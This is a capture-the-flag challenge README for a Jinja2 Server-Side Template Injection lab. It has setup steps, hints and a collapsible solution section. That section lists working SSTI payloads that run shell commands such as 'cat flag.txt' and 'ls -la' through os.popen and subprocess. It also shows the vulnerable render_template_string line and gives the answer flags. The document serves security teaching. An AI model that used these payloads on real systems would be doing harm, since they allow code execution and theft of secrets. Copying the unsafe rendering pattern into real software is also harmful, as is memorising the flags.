# Challenge 5: Server-Side Template Injection (High)

## Description
TemplateEngine is a dynamic content generator that uses Jinja2 templates to create personalized content. The application allows users to input custom templates, but the developers might not have properly sanitized user input, potentially allowing Server-Side Template Injection (SSTI) attacks.

## Objective
Exploit the Server-Side Template Injection vulnerability to execute code and retrieve the flag.

## Difficulty
⭐⭐⭐ High

## Setup
1. Install Python dependencies:
   ```bash
   pip install -r requirements.txt
   ```
2. Run the application:
   ```bash
   python app.py
   ```
3. Or use Docker:
   ```bash
   docker-compose up -d
   ```
4. Navigate to `http://localhost:5004`

## Hints
- The application uses Jinja2 templates to render user input
- Try template expressions like `{{ 7*7 }}` to test for SSTI
- Explore the template context with `{{ config }}` or `{{ self }}`
- Use `{{ ''.__class__.__mro__[1].__subclasses__() }}` to find useful classes
- Look for file reading capabilities or command execution methods
- The flag might be in `flag.txt` or you might need to execute system commands

## Flag Format
`CTF{...}`

## Solution
<details>
<summary>Click to reveal solution</summary>

This challenge demonstrates Server-Side Template Injection (SSTI) in Jinja2 templates.

**Step 1: Login**
First, login using the guest credentials (guest/guest) or any other valid credentials.

**Step 2: Confirm SSTI**
In the "Your Content" field, try:
```
{{ 7*7 }}
```
If you see `49` in the output, SSTI is confirmed.

**Step 3: Explore the environment**
Try these payloads to explore:
```
{{ config }}
{{ self }}
{{ ''.__class__ }}
```

**Step 4: Find useful classes**
```
{{ ''.__class__.__mro__[1].__subclasses__() }}
```
This shows all available Python classes.

**Step 5: File reading approach**
Look for file-related classes and try to read the flag:
```
{{ ''.__class__.__mro__[1].__subclasses__()[40]('flag.txt').read() }}
```
(The index [40] might vary - look for file-related classes)

**Step 6: Command execution approach**
Find subprocess or os-related classes:
```
{{ ''.__class__.__mro__[1].__subclasses__()[104]('cat flag.txt', shell=True, stdout=-1).communicate()[0].strip() }}
```

**Alternative working payloads:**

**Method 1: Direct file access**
```
{{ ''.__class__.__mro__[1].__subclasses__()[40]('flag.txt', 'r').read() }}
```

**Method 2: Using config object**
```
{{ config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read() }}
```

**Method 3: Subprocess execution**
```
{{ ''.__class__.__mro__[1].__subclasses__()[259]('cat flag.txt', shell=True, stdout=-1).communicate()[0] }}
```

**Method 4: Using built-in functions**
```
{{ ''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['sys'].modules['os'].popen('ls -la').read() }}
```

**Step 7: Advanced payload (works in most cases)**
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}
```

**Flags:**
- Main flag: `CTF{s3rv3r_s1d3_t3mpl4t3_1nj3ct10n_pwn3d}`
- Advanced flag: `CTF{4dv4nc3d_ssti_c0d3_3x3cut10n}` (in secret_admin_flag.txt)

**Bonus commands to try:**
- `cat secret_admin_flag.txt`
- `ls -la`
- `whoami`
- `pwd`

### How it works:
The vulnerable code directly renders user input as a Jinja2 template:
```python
output = render_template_string(template, **template_context)
```

This allows attackers to:
1. Execute arbitrary Python code
2. Access the file system
3. Execute system commands
4. Access application configuration and secrets

SSTI occurs when user input is embedded into templates without proper sanitization, allowing attackers to inject template directives that get executed server-side.

</details>

## Learning Objectives
- Understanding Server-Side Template Injection (SSTI) vulnerabilities
- Learning Jinja2 template exploitation techniques
- Understanding Python object introspection and MRO (Method Resolution Order)
- Learning about template sandbox escapes
- Understanding the importance of input sanitization in template engines
- Learning about secure template rendering practices